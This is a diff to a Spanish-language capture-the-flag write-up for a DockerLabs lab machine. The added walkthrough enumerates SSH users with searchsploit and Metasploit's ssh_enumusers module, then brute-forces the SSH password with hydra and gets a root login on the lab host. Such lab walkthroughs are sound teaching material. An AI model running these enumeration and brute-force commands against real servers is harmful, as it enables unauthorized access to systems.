@@ -9,8 +9,8 @@ platform: dockerlabs
 url: https://dockerlabs.es/
 difficulty: muyfacil
 os: linux
-hints: []
-tags: []
+hints: [ssh, user enumeration, brute force]
+tags: [searchsploit, metasploit, hydra, ssh]
 ---
 
 ## Enumeration
@@ -41,3 +41,122 @@ PORT   STATE SERVICE VERSION
 |_  256 4b:15:7e:7b:b3:07:54:3d:74:ad:e0:94:78:0c:94:93 (ED25519)
 ```
 
+Con `searchsploit` buscamos si hay alguna vulnerabilidad para openssh 7.7
+
+```bash
+searchsploit openssh 7.7
+```
+
+```plaintext
+OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                                  | linux/remote/45233.py
+OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                                            | linux/remote/45210.py
+OpenSSH < 7.7 - User Enumeration (2)                                                                                                      | linux/remote/45939.py
+```
+
+Buscamos con metasploit si hay algún módulo que enumere usuarios en SSH ya que los scripts de Python que proporciona ExploitDB se crearon con librerías obsoletas.
+
+```bash
+msfconsole -q
+```
+
+```bash
+search openssh 7
+```
+
+```plaintext
+1  auxiliary/scanner/ssh/ssh_enumusers          .                normal     No     SSH Username Enumeration
+```
+
+```bash
+use auxiliary/scanner/ssh/ssh_enumusers
+```
+
+```bash
+show options
+```
+
+```plaintext
+Module options (auxiliary/scanner/ssh/ssh_enumusers):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   CHECK_FALSE   true             no        Check for false positives (random username)
+   DB_ALL_USERS  false            no        Add all users in the current database to the list
+   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http
+   RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT         22               yes       The target port
+   THREADS       1                yes       The number of concurrent threads (max one per host)
+   THRESHOLD     10               yes       Amount of seconds needed before a user is considered found (timing attack only)
+   USERNAME                       no        Single username to test (username spray)
+   USER_FILE                      no        File containing usernames, one per line
+
+
+Auxiliary action:
+
+   Name              Description
+   ----              -----------
+   Malformed Packet  Use a malformed packet
+```
+
+```bash
+set RHOSTS 172.17.0.2
+```
+
+```bash
+set user_file /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
+```
+
+```bash
+run
+```
+
+```plaintext
+[*] 172.17.0.2:22 - SSH - Using malformed packet technique
+[*] 172.17.0.2:22 - SSH - Checking for false positives
+[*] 172.17.0.2:22 - SSH - Starting scan
+[+] 172.17.0.2:22 - SSH - User 'mail' found
+[+] 172.17.0.2:22 - SSH - User 'root' found
+[+] 172.17.0.2:22 - SSH - User 'news' found
+[+] 172.17.0.2:22 - SSH - User 'man' found
+[+] 172.17.0.2:22 - SSH - User 'bin' found
+[+] 172.17.0.2:22 - SSH - User 'games' found
+[+] 172.17.0.2:22 - SSH - User 'nobody' found
+[+] 172.17.0.2:22 - SSH - User 'lovely' found
+[+] 172.17.0.2:22 - SSH - User 'backup' found
+[+] 172.17.0.2:22 - SSH - User 'daemon' found
+[+] 172.17.0.2:22 - SSH - User 'proxy' found
+[+] 172.17.0.2:22 - SSH - User 'list' found
+[+] 172.17.0.2:22 - SSH - User 'sys' found
+```
+
+Copiamos el output a un archivo `valid_users.txt` y con `awk` nos quedamos solo con los nombres de usuarios redirigiendo el output a un archivo llamado `users.txt`
+
+```bash
+awk -F"'" '{print $2}' valid_users.txt > users.txt
+```
+
+Ahora hacemos fuerza bruta con `hydra` para ver si encontramos alguna contraseña válida para alguno de los usuarios válidos
+
+```bash
+hydra -L users.txt -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt -t 4 -I -F ssh://172.17.0.2
+```
+
+```plaintext
+[22][ssh] host: 172.17.0.2   login: root   password: estrella
+```
+
+Con el password del usuario root nos conectamos a la máquina víctima con mediante ssh
+
+```bash
+ssh root@172.17.0.2
+```
+
+Ejecutamos el comando `id` para ver qué usuario está corriendo el proceso actual.
+
+```bash
+id
+```
+
+```plaintext
+uid=0(root) gid=0(root) groups=0(root)
+```
